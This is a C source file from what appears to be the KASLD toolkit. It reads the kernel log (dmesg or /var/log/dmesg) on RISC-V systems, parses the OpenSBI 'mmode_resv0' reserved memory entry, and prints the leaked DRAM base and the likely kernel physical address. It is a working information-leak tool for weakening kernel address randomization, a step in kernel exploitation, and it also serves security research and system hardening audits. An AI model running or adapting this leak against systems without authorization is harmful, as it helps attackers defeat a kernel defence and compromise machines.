// This file is part of KASLD - https://github.com/bcoles/kasld
//
// On RISC-V systems, the OpenSBI firmware runs in M-mode (machine mode) and
// reserves physical memory at the DRAM base for its own use before handing
// off to the S-mode kernel. These reserved regions are exposed in dmesg via
// the device tree reserved memory infrastructure.
//
// For example:
//
// [    0.000000] OF: reserved mem: 0x0000000080000000..0x000000008001ffff
//   (128 KiB) nomap non-reusable mmode_resv0@80000000
// [    0.000000] OF: reserved mem: 0x0000000080020000..0x000000008003ffff
//   (128 KiB) nomap non-reusable mmode_resv1@80020000
//
// The physical address of mmode_resv0 reveals the DRAM base address.
// On RISC-V, the kernel is conventionally loaded at DRAM_BASE + 2MB
// (after the OpenSBI firmware reservation).
//
// On systems with a known phys->virt offset mapping (i.e. without KASLR or
// pre-v6.6 kernels), this may be used to identify the kernel virtual address.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/drivers/of/fdt_reserved_mem.c
// https://github.com/riscv-software-src/opensbi
// ---
// <bcoles@gmail.com>

#if !defined(__riscv) && !defined(__riscv__)
#error "Architecture is not supported"
#endif

#define _GNU_SOURCE
#include "include/kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long get_phys_addr_dmesg_reserved_mem_opensbi(void) {
  char *syslog;
  char *endptr;
  char *substr;
  char *line_buf;
  const char *needle = "mmode_resv0@";
  int size;
  unsigned long addr = 0;

  printf("[.] searching dmesg for OpenSBI reserved memory regions ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  /* mmode_resv0@80000000 */
  addr = strtoul(&substr[strlen(needle)], &endptr, 16);

  if (addr == 0)
    return 0;

  if (addr >= KERNEL_VAS_END)
    return 0;

  printf("leaked OpenSBI DRAM physical address: %#018lx\n", addr);
  return addr;
}

unsigned long get_phys_addr_dmesg_log_file_reserved_mem_opensbi(void) {
  FILE *f;
  char *endptr;
  char *substr;
  const char *path = "/var/log/dmesg";
  const char *needle = "mmode_resv0@";
  unsigned long addr = 0;
  char buff[BUFSIZ];

  printf("[.] searching %s for OpenSBI reserved memory regions ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  while ((fgets(buff, BUFSIZ, f)) != NULL) {
    substr = strstr(buff, needle);
    if (substr == NULL)
      continue;

    /* mmode_resv0@80000000 */
    addr = strtoul(&substr[strlen(needle)], &endptr, 16);

    if (addr == 0)
      break;

    if (addr >= KERNEL_VAS_END) {
      addr = 0;
      break;
    }

    printf("leaked OpenSBI DRAM physical address: %#018lx\n", addr);
    break;
  }

  fclose(f);

  return addr;
}

int main(void) {
  unsigned long phys_addr = get_phys_addr_dmesg_reserved_mem_opensbi();
  if (!phys_addr)
    phys_addr = get_phys_addr_dmesg_log_file_reserved_mem_opensbi();

  if (!phys_addr)
    return 1;

  /* kernel loads at DRAM_BASE + 2MB (after OpenSBI reservation) */
  unsigned long kernel_phys = phys_addr + KERNEL_ALIGN;

  printf("possible kernel physical address: %#018lx\n", kernel_phys);
  printf("possible PAGE_OFFSET physical address: %#018lx\n", phys_addr);

  return 0;
}
